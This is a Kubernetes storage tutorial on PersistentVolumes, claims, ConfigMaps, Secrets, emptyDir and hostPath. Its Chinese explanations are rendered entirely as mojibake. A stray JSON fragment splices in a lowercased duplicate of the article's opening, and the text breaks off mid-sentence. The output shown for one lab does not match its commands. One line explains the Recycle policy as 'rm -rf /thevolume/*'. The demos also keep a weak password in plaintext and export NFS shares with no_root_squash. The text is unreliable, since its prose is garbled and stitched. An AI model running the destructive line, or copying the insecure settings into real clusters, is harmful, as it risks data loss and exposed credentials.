åæ¶ç­ç¥\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nPV çå³é®éç½®åæ°è¯´æï¼\n\n * å­å¨ç±»å\n   åºå±å®éå­å¨çç±»åï¼kubernetes æ¯æå¤ç§å­å¨ç±»åï¼æ¯ç§å­å¨ç±»åçéç½®é½ææå·®å¼\n * å­å¨è½åï¼capacityï¼\n   ç®ååªæ¯æå­å¨ç©ºé´çè®¾ç½® (storage=1Gi)ï¼ä¸è¿æªæ¥å¯è½ä¼å å¥ IOPSãååéç­ææ çéç½®\n * è®¿é®æ¨¡å¼ï¼accessModesï¼\n   ç¨äºæè¿°ç¨æ·åºç¨å¯¹å­å¨èµæºçè®¿é®æéï¼è®¿é®æéåæ¬ä¸é¢å ç§æ¹å¼ï¼\n   * ReadWriteOnceï¼RWOï¼ï¼è¯»åæéï¼ä½æ¯åªè½è¢«åä¸ªèç¹æè½½ (æçæ¯ PV ä¸ PVC ç»å®åªè½ä¸ä¸ª)\n   * ReadOnlyManyï¼ROXï¼ï¼ åªè¯»æéï¼å¯ä»¥è¢«å¤ä¸ªèç¹æè½½\n   * ReadWriteManyï¼RWXï¼ï¼è¯»åæéï¼å¯ä»¥è¢«å¤ä¸ªèç¹æè½½\n     éè¦æ³¨æçæ¯ï¼åºå±ä¸åçå­å¨ç±»åå¯è½æ¯æçè®¿é®æ¨¡å¼ä¸å\n * åæ¶ç­ç¥ï¼persistentVolumeReclaimPolicyï¼\n   å½ PV ä¸åè¢«ä½¿ç¨äºä¹åï¼å¯¹å¶çå¤çæ¹å¼ãç®åæ¯æä¸ç§ç­ç¥ï¼\n   * Retain ï¼ä¿çï¼ ä¿çæ°æ®ï¼éè¦ç®¡çåæå·¥æ¸çæ°æ®\n   * Recycleï¼åæ¶ï¼ æ¸é¤ PV ä¸­çæ°æ®ï¼ææç¸å½äºæ§è¡ rm -rf /thevolume/*\n   * Delete ï¼å é¤ï¼ ä¸ PV ç¸è¿çåç«¯å­å¨å®æ volume çå é¤æä½ï¼å½ç¶è¿å¸¸è§äºäºæå¡åçå­å¨æå¡\n     éè¦æ³¨æçæ¯ï¼åºå±ä¸åçå­å¨ç±»åå¯è½æ¯æçåæ¶ç­ç¥ä¸å\n * å­å¨ç±»å«\n   PV å¯ä»¥éè¿ storageClassName åæ°æå®ä¸ä¸ªå­å¨ç±»å«\n   * å·æç¹å®ç±»å«ç PV åªè½ä¸è¯·æ±äºè¯¥ç±»å«ç PVC è¿è¡ç»å®\n   * æªè®¾å®ç±»å«ç PV ååªè½ä¸ä¸è¯·æ±ä»»ä½ç±»å«ç PVC è¿è¡ç»å®\n * ç¶æï¼statusï¼\n   ä¸ä¸ª PV ççå½å¨æä¸­ï¼å¯è½ä¼å¤äº 4 ä¸­ä¸åçé¶æ®µï¼\n   * Availableï¼å¯ç¨ï¼ï¼ è¡¨ç¤ºå¯ç¨ç¶æï¼è¿æªè¢«ä»»ä½ PVC ç»å®\n   * Boundï¼å·²ç»å®ï¼ï¼ è¡¨ç¤º PV å·²ç»è¢« PVC ç»å®\n   * Releasedï¼å·²éæ¾ï¼ï¼ è¡¨ç¤º PVC è¢«å é¤ï¼ä½æ¯èµæºè¿æªè¢«éç¾¤éæ°å£°æ\n   * Failedï¼å¤±è´¥ï¼ï¼ è¡¨ç¤ºè¯¥ PV çèªå¨åæ¶å¤±è´¥\n\nå®éª\nä½¿ç¨ NFS ä½ä¸ºå­å¨ï¼æ¥æ¼ç¤º PV çä½¿ç¨ï¼åå»º 3 ä¸ª PVï¼å¯¹åº NFS ä¸­ç 3 ä¸ªæ´é²çè·¯å¾ã\n1. åå¤ NFS ç¯å¢\n\n# åå»ºç®å½\n[root@nfs ~]# mkdir /root/data/{pv1,pv2,pv3} -pv\n\n# æ´é²æå¡\n[root@nfs ~]# more /etc/exports\n/root/data/pv1     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv2     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv3     192.168.5.0/24(rw,no_root_squash)\n\n# éå¯æå¡\n[root@nfs ~]#  systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n2. åå»º pv.yaml\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv1\nspec:\n  capacity: \n    storage: 1Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv1\n    server: 192.168.5.6\n\n---\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv2\nspec:\n  capacity: \n    storage: 2Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv2\n    server: 192.168.5.6\n    \n---\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv3\nspec:\n  capacity: \n    storage: 3Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv3\n    server: 192.168.5.6\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n# åå»º pv\n[root@k8s-master01 ~]# kubectl create -f pv.yaml\npersistentvolume/pv1 created\npersistentvolume/pv2 created\npersistentvolume/pv3 created\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nNAME   CAPACITY   ACCESS MODES  RECLAIM POLICY  STATUS      AGE   VOLUMEMODE\npv1    1Gi        RWX            Retain        Available    10s   Filesystem\npv2    2Gi        RWX            Retain        Available    10s   Filesystem\npv3    3Gi        RWX            Retain        Available    9s    Filesystem\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# PVC\n\nPVC æ¯èµæºçç³è¯·ï¼ç¨æ¥å£°æå¯¹å­å¨ç©ºé´ãè®¿é®æ¨¡å¼ãå­å¨ç±»å«éæ±ä¿¡æ¯ãä¸é¢æ¯èµæºæ¸åæä»¶:\n\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc\n  namespace: dev\nspec:\n  accessModes: # è®¿é®æ¨¡å¼\n  selector: # éç¨æ ç­¾å¯¹PVéæ©\n  storageClassName: # å­å¨ç±»å«\n  resources: # è¯·æ±ç©ºé´\n    requests:\n      storage: 5Gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nPVC çå³é®éç½®åæ°è¯´æï¼\n\n * è®¿é®æ¨¡å¼ï¼accessModesï¼\n   ç¨äºæè¿°ç¨æ·åºç¨å¯¹å­å¨èµæºçè®¿é®æé\n * éæ©æ¡ä»¶ï¼selectorï¼\n   éè¿ Label Selector çè®¾ç½®ï¼å¯ä½¿ PVC å¯¹äºç³»ç»ä¸­å·±å­å¨ç PV è¿è¡ç­é\n * å­å¨ç±»å«ï¼storageClassNameï¼\n   PVC å¨å®ä¹æ¶å¯ä»¥è®¾å®éè¦çåç«¯å­å¨çç±»å«ï¼åªæè®¾ç½®äºè¯¥ class ç pv æè½è¢«ç³»ç»éåº\n * èµæºè¯·æ±ï¼Resources ï¼\n   æè¿°å¯¹å­å¨èµæºçè¯·æ±\n\nå®éª\n1. åå»º pvc.yamlï¼ç³è¯· pv\n\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc1\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc2\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc3\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n# åå»ºpvc\n[root@k8s-master01 ~]# kubectl create -f pvc.yaml\npersistentvolumeclaim/pvc1 created\npersistentvolumeclaim/pvc2 created\npersistentvolumeclaim/pvc3 created\n\n# æ¥çpvc\n[root@k8s-master01 ~]# kubectl get pvc  -n dev -o wide\nNAME   STATUS   VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   AGE   VOLUMEMODE\npvc1   Bound    pv1      1Gi        RWX                           15s   Filesystem\npvc2   Bound    pv2      2Gi        RWX                           15s   Filesystem\npvc3   Bound    pv3      3Gi        RWX                           15s   Filesystem\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nNAME  CAPACITY ACCESS MODES  RECLAIM POLICY  STATUS    CLAIM       AGE     VOLUMEMODE\npv1    1Gi        RWx        Retain          Bound    dev/pvc1    3h37m    Filesystem\npv2    2Gi        RWX        Retain          Bound    dev/pvc2    3h37m    Filesystem\npv3    3Gi        RWX        Retain          Bound    dev/pvc3    3h37m    Filesystem   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n2. åå»º pods.yaml, ä½¿ç¨ pv\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod1\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod1 >> /root/out.txt; sleep 10; done;"]\n    volumeMounts:\n    - name: volume\n      mountPath: /root/\n  volumes:\n    - name: volume\n      persistentVolumeClaim:\n        claimName: pvc1\n        readOnly: false\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod2\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod2 >> /root/out.txt; sleep 10; done;"]\n    volumeMounts:\n    - name: volume\n      mountPath: /root/\n  volumes:\n    - name: volume\n      persistentVolumeClaim:\n        claimName: pvc2\n        readOnly: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pods.yaml\npod/pod1 created\npod/pod2 created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME   READY   STATUS    RESTARTS   AGE   IP            NODE   \npod1   1/1     Running   0          14s   10.244.1.69   node1   \npod2   1/1     Running   0          14s   10.244.1.70   node1  \n\n# æ¥çpvc\n[root@k8s-master01 ~]# kubectl get pvc -n dev -o wide\nNAME   STATUS   VOLUME   CAPACITY   ACCESS MODES      AGE   VOLUMEMODE\npvc1   Bound    pv1      1Gi        RWX               94m   Filesystem\npvc2   Bound    pv2      2Gi        RWX               94m   Filesystem\npvc3   Bound    pv3      3Gi        RWX               94m   Filesystem\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -n dev -o wide\nNAME   CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM       AGE     VOLUMEMODE\npv1    1Gi        RWX            Retain           Bound    dev/pvc1    5h11m   Filesystem\npv2    2Gi        RWX            Retain           Bound    dev/pvc2    5h11m   Filesystem\npv3    3Gi        RWX            Retain           Bound    dev/pvc3    5h11m   Filesystem\n\n# æ¥çnfsä¸­çæä»¶å­å¨\n[root@nfs ~]# more /root/data/pv1/out.txt\nnode1\nnode1\n[root@nfs ~]# more /root/data/pv2/out.txt\nnode2\nnode2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# çå½å¨æ\n\nPVC å PV æ¯ä¸ä¸å¯¹åºçï¼PV å PVC ä¹é´çç¸äºä½ç¨éµå¾ªä»¥ä¸çå½å¨æï¼\n\n * èµæºä¾åºï¼ç®¡çåæå¨åå»ºåºå±å­å¨å PV\n * èµæºç»å®ï¼ç¨æ·åå»º PVCï¼kubernetes è´è´£æ ¹æ® PVC çå£°æå»å¯»æ¾ PVï¼å¹¶ç»å®\n   å¨ç¨æ·å®ä¹å¥½ PVC ä¹åï¼ç³»ç»å°æ ¹æ® PVC å¯¹å­å¨èµæºçè¯·æ±å¨å·²å­å¨ç PV ä¸­éæ©ä¸ä¸ªæ»¡è¶³æ¡ä»¶ç\n   * ä¸æ¦æ¾å°ï¼å°±å°è¯¥ PV ä¸ç¨æ·å®ä¹ç PVC è¿è¡ç»å®ï¼ç¨æ·çåºç¨å°±å¯ä»¥ä½¿ç¨è¿ä¸ª PVC äº\n   * å¦ææ¾ä¸å°ï¼PVC åä¼æ éæå¤äº Pending ç¶æï¼ç´å°ç­å°ç³»ç»ç®¡çååå»ºäºä¸ä¸ªç¬¦åå¶è¦æ±ç PV\n     PVä¸æ¦ç»å®å°æä¸ªPVCä¸ï¼å°±ä¼è¢«è¿ä¸ªPVCç¬å ï¼ä¸è½åä¸å¶ä»PVCè¿è¡ç»å®äº\n * èµæºä½¿ç¨ï¼ç¨æ·å¯å¨ pod ä¸­å volume ä¸æ ·ä½¿ç¨ pvc\n   Pod ä½¿ç¨ Volume çå®ä¹ï¼å° PVC æè½½å°å®¹å¨åçæä¸ªè·¯å¾è¿è¡ä½¿ç¨ã\n * èµæºéæ¾ï¼ç¨æ·å é¤ pvc æ¥éæ¾ pv\n   å½å­å¨èµæºä½¿ç¨å®æ¯åï¼ç¨æ·å¯ä»¥å é¤ PVCï¼ä¸è¯¥ PVC ç»å®ç PV å°ä¼è¢«æ è®°ä¸º âå·²éæ¾âï¼ä½è¿ä¸è½ç«å»ä¸å¶ä» PVC è¿è¡ç»å®ãéè¿ä¹å PVC åå¥çæ°æ®å¯è½è¿è¢«çå¨å­å¨è®¾å¤ä¸ï¼åªæå¨æ¸é¤ä¹åè¯¥ PV æè½åæ¬¡ä½¿ç¨ã\n * èµæºåæ¶ï¼kubernetes æ ¹æ® pv è®¾ç½®çåæ¶ç­ç¥è¿è¡èµæºçåæ¶\n   å¯¹äº PVï¼ç®¡çåå¯ä»¥è®¾å®åæ¶ç­ç¥ï¼ç¨äºè®¾ç½®ä¸ä¹ç»å®ç PVC éæ¾èµæºä¹åå¦ä½å¤çéçæ°æ®çé®é¢ãåªæ PV çå­å¨ç©ºé´å®æåæ¶ï¼æè½ä¾æ°ç PVC ç»å®åä½¿ç¨\n\n\n\n\n# éç½®å­å¨\n\n\n# ConfigMap\n\nConfigMap æ¯ä¸ç§æ¯è¾ç¹æ®çå­å¨å·ï¼å®çä¸»è¦ä½ç¨æ¯ç¨æ¥å­å¨éç½®ä¿¡æ¯çã\n\nåå»º configmap.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: configmap\n  namespace: dev\ndata:\n  info: |\n    username:admin\n    password:123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ¥ä¸æ¥ï¼ä½¿ç¨æ­¤éç½®æä»¶åå»º configmap\n\n# åå»ºconfigmap\n[root@k8s-master01 ~]# kubectl create -f configmap.yaml\nconfigmap/configmap created\n\n# æ¥çconfigmapè¯¦æ\n[root@k8s-master01 ~]# kubectl describe cm configmap -n dev\nName:         configmap\nNamespace:    dev\nLabels:       <none>\nAnnotations:  <none>\n\nData\n====\ninfo:\n----\nusername:admin\npassword:123456\n\nEvents:  <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\næ¥ä¸æ¥åå»ºä¸ä¸ª pod-configmap.yamlï¼å°ä¸é¢åå»ºç configmap æè½½è¿å»\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-configmap\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumeMounts: # å°configmapæè½½å°ç®å½\n    - name: config\n      mountPath: /configmap/config\n  volumes: # å¼ç¨configmap\n  - name: config\n    configMap:\n      name: configmap\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-configmap.yaml\npod/pod-configmap created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pod pod-configmap -n dev\nNAME            READY   STATUS    RESTARTS   AGE\npod-configmap   1/1     Running   0          6s\n\n#è¿å¥å®¹å¨\n[root@k8s-master01 ~]# kubectl exec -it pod-configmap -n dev /bin/sh\n# cd /configmap/config/\n# ls\ninfo\n# more info\nusername:admin\npassword:123456\n\n# å¯ä»¥çå°æ å°å·²ç»æåï¼æ¯ä¸ªconfigmapé½æ å°æäºä¸ä¸ªç®å½\n# key---\x3eæä»¶     value----\x3eæä»¶ä¸­çåå®¹\n# æ­¤æ¶å¦ææ´æ°configmapçåå®¹, å®¹å¨ä¸­çå¼ä¹ä¼å¨ææ´æ°\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# Secret\n\nå¨ kubernetes ä¸­ï¼è¿å­å¨ä¸ç§å ConfigMap éå¸¸ç±»ä¼¼çå¯¹è±¡ï¼ç§°ä¸º Secret å¯¹è±¡ãå®ä¸»è¦ç¨äºå­å¨ææä¿¡æ¯ï¼ä¾å¦å¯ç ãç§é¥ãè¯ä¹¦ç­ç­ã\n\n1. é¦åä½¿ç¨ base64 å¯¹æ°æ®è¿è¡ç¼ç \n\n[root@k8s-master01 ~]# echo -n \'admin\' | base64 #åå¤username\nYWRtaW4=\n[root@k8s-master01 ~]# echo -n \'123456\' | base64 #åå¤password\nMTIzNDU2\n\n\n1\n2\n3\n4\n\n\n2. æ¥ä¸æ¥ç¼å secret.yamlï¼å¹¶åå»º Secret\n\napiVersion: v1\nkind: Secret\nmetadata:\n  name: secret\n  namespace: dev\ntype: Opaque\ndata:\n  username: YWRtaW4=\n  password: MTIzNDU2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# åå»ºsecret\n[root@k8s-master01 ~]# kubectl create -f secret.yaml\nsecret/secret created\n\n# æ¥çsecretè¯¦æ\n[root@k8s-master01 ~]# kubectl describe secret secret -n dev\nName:         secret\nNamespace:    dev\nLabels:       <none>\nAnnotations:  <none>\nType:  Opaque\nData\n====\npassword:  6 bytes\nusername:  5 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n3. åå»º pod-secret.yamlï¼å°ä¸é¢åå»ºç secret æè½½è¿å»ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-secret\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumeMounts: # å°secretæè½½å°ç®å½\n    - name: config\n      mountPath: /secret/config\n  volumes:\n  - name: config\n    secret:\n      secretName: secret\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-secret.yaml\npod/pod-secret created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pod pod-secret -n dev\nNAME            READY   STATUS    RESTARTS   AGE\npod-secret      1/1     Running   0          2m28s\n\n# è¿å¥å®¹å¨ï¼æ¥çsecretä¿¡æ¯ï¼åç°å·²ç»èªå¨è§£ç äº\n[root@k8s-master01 ~]# kubectl exec -it pod-secret /bin/sh -n dev\n/ # ls /secret/config/\npassword  username\n/ # more /secret/config/username\nadmin\n/ # more /secret/config/password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nè³æ­¤ï¼å·²ç»å®ç°äºå©ç¨ secret å®ç°äºä¿¡æ¯çç¼ç ã',normalizedContent:'å¨åé¢å·²ç»æå°ï¼å®¹å¨ççå½å¨æå¯è½å¾ç­ï¼ä¼è¢«é¢ç¹å°åå»ºåéæ¯ãé£ä¹å®¹å¨å¨éæ¯æ¶ï¼ä¿å­å¨å®¹å¨ä¸­çæ°æ®ä¹ä¼è¢«æ¸é¤ãè¿ç§ç»æå¯¹ç¨æ·æ¥è¯´ï¼å¨æäºæåµä¸æ¯ä¸ä¹æçå°çãä¸ºäºæä¹åä¿å­å®¹å¨çæ°æ®ï¼kubernetes å¼å¥äº volume çæ¦å¿µã\n\nvolume æ¯ pod ä¸­è½å¤è¢«å¤ä¸ªå®¹å¨è®¿é®çå±äº«ç®å½ï¼å®è¢«å®ä¹å¨ pod ä¸ï¼ç¶åè¢«ä¸ä¸ª pod éçå¤ä¸ªå®¹å¨æè½½å°å·ä½çæä»¶ç®å½ä¸ï¼kubernetes éè¿ volume å®ç°åä¸ä¸ª pod ä¸­ä¸åå®¹å¨ä¹é´çæ°æ®å±äº«ä»¥åæ°æ®çæä¹åå­å¨ãvolume ççå½å®¹å¨ä¸ä¸ pod ä¸­åä¸ªå®¹å¨ççå½å¨æç¸å³ï¼å½å®¹å¨ç»æ­¢æèéå¯æ¶ï¼volume ä¸­çæ°æ®ä¹ä¸ä¼ä¸¢å¤±ã\n\nkubernetes ç volume æ¯æå¤ç§ç±»åï¼æ¯è¾å¸¸è§çæä¸é¢å ä¸ªï¼\n\n * ç®åå­å¨ï¼emptydirãhostpathãnfs\n * é«çº§å­å¨ï¼pvãpvc\n * éç½®å­å¨ï¼configmapãsecret\n\n\n# åºæ¬å­å¨\n\n\n# emptydir\n\nemptydir æ¯æåºç¡ç volume ç±»åï¼ä¸ä¸ª emptydir å°±æ¯ host ä¸çä¸ä¸ªç©ºç®å½ã\n\nemptydir æ¯å¨ pod è¢«åéå° node æ¶åå»ºçï¼å®çåå§åå®¹ä¸ºç©ºï¼å¹¶ä¸æ é¡»æå®å®¿ä¸»æºä¸å¯¹åºçç®å½æä»¶ï¼å ä¸º kubernetes ä¼èªå¨åéä¸ä¸ªç®å½ï¼å½ pod éæ¯æ¶ï¼ emptydir ä¸­çæ°æ®ä¹ä¼è¢«æ°¸ä¹å é¤ã emptydir ç¨éå¦ä¸ï¼\n\n * ä¸´æ¶ç©ºé´ï¼ä¾å¦ç¨äºæäºåºç¨ç¨åºè¿è¡æ¶æéçä¸´æ¶ç®å½ï¼ä¸æ é¡»æ°¸ä¹ä¿ç\n * ä¸ä¸ªå®¹å¨éè¦ä»å¦ä¸ä¸ªå®¹å¨ä¸­è·åæ°æ®çç®å½ï¼å¤å®¹å¨å±äº«ç®å½ï¼\n\næ¥ä¸æ¥ï¼éè¿ä¸ä¸ªå®¹å¨ä¹é´æä»¶å±äº«çæ¡ä¾æ¥ä½¿ç¨ä¸ä¸ emptydirã\n\nå¨ä¸ä¸ª pod ä¸­åå¤ä¸¤ä¸ªå®¹å¨ nginx å busyboxï¼ç¶åå£°æä¸ä¸ª volume åå«æå¨å°ä¸¤ä¸ªå®¹å¨çç®å½ä¸­ï¼ç¶å nginx å®¹å¨è´è´£å volume ä¸­åæ¥å¿ï¼busybox ä¸­éè¿å½ä»¤å°æ¥å¿åå®¹è¯»å°æ§å¶å°ã\n\n\n\nåå»ºä¸ä¸ª volume-emptydir.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-emptydir\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:  # å°logs-volumeæå¨å°nginxå®¹å¨ä¸­ï¼å¯¹åºçç®å½ä¸º /var/log/nginx\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] # åå§å½ä»¤ï¼å¨æè¯»åæå®æä»¶ä¸­åå®¹\n    volumemounts:  # å°logs-volume æå¨å°busyboxå®¹å¨ä¸­ï¼å¯¹åºçç®å½ä¸º /logs\n    - name: logs-volume\n      mountpath: /logs\n  volumes: # å£°ævolumeï¼ nameä¸ºlogs-volumeï¼ç±»åä¸ºemptydir\n  - name: logs-volume\n    emptydir: {}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f volume-emptydir.yaml\npod/volume-emptydir created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods volume-emptydir -n dev -o wide\nname                  ready   status    restarts   age      ip       node   ...... \nvolume-emptydir       2/2     running   0          97s   10.42.2.9   node1  ......\n\n# éè¿podipè®¿é®nginx\n[root@k8s-master01 ~]# curl 10.42.2.9\n......\n\n# éè¿kubectl logså½ä»¤æ¥çæå®å®¹å¨çæ åè¾åº\n[root@k8s-master01 ~]# kubectl logs -f volume-emptydir -n dev -c busybox\n10.42.1.0 - - [27/jun/2021:15:08:54 +0000] "get / http/1.1" 200 612 "-" "curl/7.29.0" "-"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# hostpath\n\nemptydir ä¸­æ°æ®ä¸ä¼è¢«æä¹åï¼å®ä¼éç pod çç»æèéæ¯ï¼å¦ææ³ç®åçå°æ°æ®æä¹åå°ä¸»æºä¸­ï¼å¯ä»¥éæ© hostpathã\n\nhostpath å°±æ¯å° node ä¸»æºä¸­ä¸ä¸ªå®éç®å½æå¨å° pod ä¸­ï¼ä»¥ä¾å®¹å¨ä½¿ç¨ï¼è¿æ ·çè®¾è®¡å°±å¯ä»¥ä¿è¯ pod éæ¯äºï¼ä½æ¯æ°æ®ä¾æ®å¯ä»¥å­å¨äº node ä¸»æºä¸ã\n\n\n\nåå»ºä¸ä¸ª volume-hostpath.yamlï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-hostpath\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"]\n    volumemounts:\n    - name: logs-volume\n      mountpath: /logs\n  volumes:\n  - name: logs-volume\n    hostpath: \n      path: /root/logs #å®¿ä¸»æºç®å½\n      type: directoryorcreate  # ç®å½å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n> å³äº type çå¼çä¸ç¹è¯´æï¼\n> directoryorcreate ç®å½å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n> directory ç®å½å¿é¡»å­å¨\n> fileorcreate æä»¶å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n> file æä»¶å¿é¡»å­å¨\n> socket unix å¥æ¥å­å¿é¡»å­å¨\n> chardevice å­ç¬¦è®¾å¤å¿é¡»å­å¨\n> blockdevice åè®¾å¤å¿é¡»å­å¨\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f volume-hostpath.yaml\npod/volume-hostpath created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods volume-hostpath -n dev -o wide\nname                  ready   status    restarts   age   ip             node   ......\npod-volume-hostpath   2/2     running   0          16s   10.42.2.10     node1  ......\n\n#è®¿é®nginx\n[root@k8s-master01 ~]# curl 10.42.2.10\n\n# æ¥ä¸æ¥å°±å¯ä»¥å»hostç/root/logsç®å½ä¸æ¥çå­å¨çæä»¶äº\n###  æ³¨æ: ä¸é¢çæä½éè¦å°podæå¨çèç¹è¿è¡ï¼æ¡ä¾ä¸­æ¯node1ï¼\n[root@node1 ~]# ls /root/logs/\naccess.log  error.log\n\n# åæ ·çéçï¼å¦æå¨æ­¤ç®å½ä¸åå»ºä¸ä¸ªæä»¶ï¼å°å®¹å¨ä¸­ä¹æ¯å¯ä»¥çå°ç\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n> æ³¨æï¼pod è¢« k8s é¨ç½²å¨åªä¸ª nodeï¼æä»¶å°±å¨é£ä¸ª node ä¸æè½½\n\n\n# nfs\n\nhostpath å¯ä»¥è§£å³æ°æ®æä¹åçé®é¢ï¼ä½æ¯ä¸æ¦ node èç¹æéäºï¼pod å¦æè½¬ç§»å°äºå«çèç¹ï¼åä¼åºç°é®é¢äºï¼æ­¤æ¶éè¦åå¤åç¬çç½ç»å­å¨ç³»ç»ï¼æ¯è¾å¸¸ç¨çç¨ nfsãcifsã\n\nnfs æ¯ä¸ä¸ªç½ç»æä»¶å­å¨ç³»ç»ï¼å¯ä»¥æ­å»ºä¸å° nfs æå¡å¨ï¼ç¶åå° pod ä¸­çå­å¨ç´æ¥è¿æ¥å° nfs ç³»ç»ä¸ï¼è¿æ ·çè¯ï¼æ è®º pod å¨èç¹ä¸æä¹è½¬ç§»ï¼åªè¦ node è· nfs çå¯¹æ¥æ²¡é®é¢ï¼æ°æ®å°±å¯ä»¥æåè®¿é®ã\n\n\n\n1ï¼é¦åè¦åå¤ nfs 